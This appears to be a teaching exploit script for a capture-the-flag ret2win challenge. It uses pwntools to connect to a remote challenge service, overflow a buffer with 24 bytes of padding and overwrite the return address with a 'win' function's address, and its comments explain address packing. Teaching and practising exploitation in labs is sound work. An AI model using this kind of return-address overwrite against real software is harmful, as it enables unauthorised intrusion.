# Install pip3 and pwntools:
# sudo apt install python3-pip; pip3 install --user pwntools
# Here's a example script for this challenge:

from pwn import *

local = False

if local:
	r = process("./service7")
else:
	r = remote("164.92.231.120", 5000)

s = r.recvuntil("What's your name?")

#r.sendline("1") # string length
#s = r.recvuntil("Give me a string: ")

# Change 0 to the correct number of A's to rewrite the return address with the address you want to jump to
n = 24

# Remember, we should always check what binary we are dealing with:
# $ file ret2win
# ret2win: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ee7de11974d30585071a95b25df3301cffdffece, not stripped
# 
# p32() -> converts an address to the string representation - 4 bytes
# Same as struct.pack("<I", 0x804863d)
#
# For 64 bit binaries, we can use p64() - 8 bytes

# we should get the address of the win function, using a disassembler, debugger, etc:
#win_function = p32(0x804863d)
# or we can just use pwntools:
elf = ELF("./service7")
win_function = elf.symbols["win"]

print(win_function)

payload = b"A"*n + p64(win_function)

r.sendline(payload)

r.interactive()
